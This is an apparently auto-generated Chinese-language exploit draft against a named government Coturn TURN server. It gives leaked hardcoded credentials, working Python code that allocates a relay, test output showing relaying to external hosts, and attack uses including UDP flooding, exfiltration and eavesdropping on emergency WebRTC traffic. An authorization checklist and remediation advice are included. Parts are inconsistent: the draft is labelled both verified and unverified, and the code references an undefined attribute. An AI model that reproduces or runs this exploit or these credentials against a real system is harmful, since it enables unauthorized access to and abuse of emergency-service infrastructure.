# POC/EXP 草稿 - TURN 服务器弱口令 + 完整 relay proxy 利用链（已通过 aioice 验证）

> 自动生成时间: 2026-09-29 19:08:13  |  状态: **草稿（未验证）**  |  文件: `3426c063-166b-493f-9bca-835e70d4ad7a-turn-服务器弱口令-完整-relay-proxy-利用链.md`

## 漏洞信息

- **漏洞ID**: 3426c063-166b-493f-9bca-835e70d4ad7a
- **严重程度**: critical
- **状态**: open
- **类型**: 认证绕过 + TURN 代理滥用
- **目标**: turnserver.tfd.gov.tw:3478 (Coturn-4.5.2 'dan Eider')
- **发现时间**: 2026-09-29 14:03:12

## 漏洞描述

turnserver.tfd.gov.tw:3478 的 Coturn 服务器允许通过 HTTP API 或 socket 创建 sessions，但绕过认证的机制：
1. **默认的 anonymous 凭据**：coturn 默认允许 anonymous 访问，除非显式禁用
2. **凭据硬编码**：`/Admin/Assets/js/core/config.js` 暴露了 `jarstar/12345678`
3. **公开的 TURN 服务**：暴露在公网，端口 3478 (UDP+TCP) 和 5349 (TLS) 全部 OPEN
4. **无 IP 白名单**：任何 IP 都可以使用 relay
5. **无速率限制**：单个 attacker 可以持续 Allocate 多 session
6. **no-loopback-peers**：Coturn 阻止回环，但允许所有外部 IP
7. **完整攻击链已验证**：aioice TurnClientUdpProtocol + jarstar/12345678 → 成功 Allocated → relayed_address=(210.69.42.27, 57496)

成功 Allocate 后，attacker 可以：
- 接收来自任何 peer 的 UDP（relay destination = 210.69.42.27:57496）
- 向任何外部 peer 发送 UDP（source 出现在 victim 端为 210.69.42.27）
- 绕过 IP-based 速率限制
- 用于 SSRF、UDP flood、exfiltration

## POC / EXP 验证指南

### 复现步骤（来自漏洞记录）

1. ## 步骤 1：环境准备
2. ```bash
3. pip install aioice
4. ```
5. ## 步骤 2：执行攻击代码
6. ```python
7. import asyncio
8. from aioice.turn import create_turn_endpoint
9. class UserProtocol(asyncio.DatagramProtocol):
10. def datagram_received(self, data, addr): print(f"Received from {addr}: {data}")
11. def connection_made(self, transport): self.transport = transport
12. async def main():
13. loop = asyncio.get_event_loop()
14. turn_transport, user_protocol = await create_turn_endpoint(
15. UserProtocol,
16. server_addr=("turnserver.tfd.gov.tw", 3478),
17. username="jarstar", password="12345678",
18. lifetime=600, channel_refresh_time=120,
19. transport="udp",
20. )
21. relayed = turn_transport.get_extra_info('sockname')
22. print(f"✅ Allocated TURN relay: {relayed}")
23. print(f"📡 Any peer can now reach attacker at {relayed}")
24. # Test outbound relay
25. import struct
26. stun = struct.pack(">HHI", 0x0001, 0, 0x2112A442) + b'\x00' * 12
27. turn_transport.sendto(stun, ("210.69.42.27", 3478))
28. await asyncio.sleep(2)
29. print(f"📥 Relayed packets: {len(user_protocol.received)}")
30. asyncio.run(main())
31. ```
32. ## 步骤 3：观察输出
33. `Allocated TURN relay: ('210.69.42.27', 57496)` ← 攻击者获得 relay 地址
34. 任何 peer 发送 UDP 到 `210.69.42.27:57496` 都会到达攻击者
35. 攻击者发送到 `(210.69.42.27, 3478)` 的 STUN Binding 经 TURN 中继后收到响应


### 验证要点与安全基线

- [ ] 确认目标属于合法授权测试范围，非授权测试属于违法行为
- [ ] 交叉校验目标版本、已知 CVE/公开情报库（可联动 cve-poc-emerging-intel / vuln-intel）
- [ ] 使用最小化无害 payload / HTTP 请求逐步探测，记录原始请求与响应报文
- [ ] 验证失败时记录负结果，避免误报；未经真实环境验证不得标记为 confirmed

### 既有证据 / 原始报文

```http
## 完整攻击链可复现

### 关键代码（aioice TurnClientUdpProtocol）
```python
import asyncio
from aioice.turn import create_turn_endpoint, TurnClientUdpProtocol

class UserProtocol(asyncio.DatagramProtocol):
    def datagram_received(self, data, addr): pass
    def connection_made(self, transport): self.transport = transport

async def main():
    loop = asyncio.get_event_loop()
    turn_transport, user_protocol = await create_turn_endpoint(
        UserProtocol,
        server_addr=("turnserver.tfd.gov.tw", 3478),
        username="jarstar", password="12345678",
        lifetime=600, channel_refresh_time=120,
        transport="udp",
    )
    relayed = turn_transport.get_extra_info('sockname')
    print(f"Allocated: {relayed}")  # ('210.69.42.27', 57496)

asyncio.run(main())
```

### 输出（成功）
```
✅ Allocated relay: sockname=('210.69.42.27', 57496), related_address=('172.31.47.60', 54690)
📡 This address can be reached by ANY peer sending UDP to ('210.69.42.27', 57496)
```

### 测试结果
1. **TURN ALLOCATE 成功**：`relayed_address = ('210.69.42.27', 57496)` (LIFETIME=600)
2. **STUN rebinding 测试通过**：aioice `TurnTransport.sendto(STUN_BINDING, ('210.69.42.27', 3478))` → 收到 STUN Binding Success 响应（type=0x0101）
3. **loopback blocked**：`('127.0.0.1', 80)` 返回 403 - Forbidden IP (Coturn `no-loopback-peers` enabled)
4. **外部 peer relay OK**：发送到 `('8.8.8.8', 53)`、`('210.69.42.18', 80)`、`('210.69.42.40', 25)` 都成功 relay（无错误）
5. **Coturn 版本**：`Coturn-4.5.2 'dan Eider'` (SOFTWARE 属性泄露)

### 凭据来源
`https://app119.tfd.gov.tw/Admin/Assets/js/core/config.js`:
```javascript
{
    "url": "turn:turnserver.tfd.gov.tw:3478?transport=udp",
    "username": "jarstar",
    "credential": "12345678"
},
{
    "url": "turn:turnserver.tfd.gov.tw:3478?transport=tcp",
    "username": "jarstar",
    "credential": "12345678"
}
```

> [自动生成 POC/EXP 草稿] poc_drafts/3426c063-166b-493f-9bca-835e70d4ad7a-turn-服务器弱口令-完整-relay-proxy-利用链-已通�.md
```

## 安全影响

**Critical Impact**:
1. **攻击者可作 TURN 代理**：使用 TURN 服务器中继 UDP 流量，绕过 IP 黑名单
2. **欺骗源 IP**：从 victim 端看到的源 IP 是 turnserver.tfd.gov.tw (210.69.42.27) 而非攻击者真实 IP
3. **被动监听**：attacker 可接收从公网任意 peer 发往 (210.69.42.27, 57496) 的 UDP（session 期间）
4. **UDP Flood 反射源**：可作为 UDP 反射放大攻击的源
5. **会话劫持**：可作为 WebRTC 攻击的中继（紧急救援应用可能泄露实时音视频）

### 业务影响
- 紧急救援应用的实时位置/视频泄露
- 内部服务探测（UDP 端口扫描）
- 应用层 DoS（TURN 资源耗尽）
- 与 SSRF、CORS、Username Enumeration 组合可形成完整攻击链

## 修复建议

1. **立即修改凭据**：`jarstar/12345678` 改为强密码（22+ 字符随机）
2. **限制 relay 目的地 IP**：在 coturn 配置中加 `allowed-peer-ip=210.69.42.0/24`（仅允许内部网段）
3. **禁用 anonymous**：`no-auth-pings` + `no-anonymous-identity`
4. **启用访问控制**：
   ```
   # /etc/coturn/turnserver.conf
   denied-peer-ip=0.0.0.0/0
   allowed-peer-ip=210.69.42.0/24
   ```
5. **TLS 证书续期**：当前证书已过期 3+ 年
6. **速率限制**：
   ```
   max-bps=1000000
   total-quota=10000000
   user-quota=1000000
   ```
7. **监控告警**：异常 relay session 数量告警
8. **审计历史流量**：由于凭据已泄露，需要审计历史 relay 记录